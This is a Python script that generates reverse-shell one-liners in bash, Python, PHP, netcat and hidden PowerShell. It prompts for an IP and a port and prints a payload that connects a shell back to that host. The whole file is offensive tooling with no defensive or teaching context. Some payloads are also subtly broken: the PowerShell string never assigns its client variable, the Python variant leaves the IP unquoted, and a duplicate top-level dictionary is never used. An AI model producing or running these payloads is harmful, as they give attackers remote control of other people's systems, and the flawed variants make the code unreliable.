shells = {
    "bash": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "python": "python -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"{ip}\",{port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn(\"/bin/bash\")'",
    "php": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "nc": "nc -e /bin/sh {ip} {port}",
    "powershell": (
        "powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
        "New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});"
        "$stream = $client.GetStream();"
        "[byte[]]$bytes = 0..65535|%{{0}};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "$sendback = (iex $data 2>&1 | Out-String );"
        "$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"
    )
}


def generate(ip, port, lang):
    shells = {
        "bash": (
            "bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        ),
        "python": (
            "python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(({ip}, {port})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p=subprocess.call([\"/bin/bash\", \"-i\"]);'"
        ),
        "php": (
            "<?php exec(\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"); ?>"
        ),
        "powershell": (
            "powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
            "New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});"
            "$stream = $client.GetStream();"
            "[byte[]]$bytes = 0..65535|%{{0}};"
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
            "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            "$sendback = (iex $data 2>&1 | Out-String );"
            "$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";"
            "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"
        ),
        "nc": (
            "nc -e /bin/bash {ip} {port}"
        ),
    }

    if lang in shells:
        return shells[lang].format(ip=ip, port=port)
    else:
        raise ValueError("Unsupported language")

if __name__ == "__main__":
    ip = input("Enter your IP: ")
    port = input("Enter port: ")
    lang = input("Language (bash/python/php/nc/powershell): ").strip().lower()
    print("\nPayload:\n" + generate(ip, port, lang))

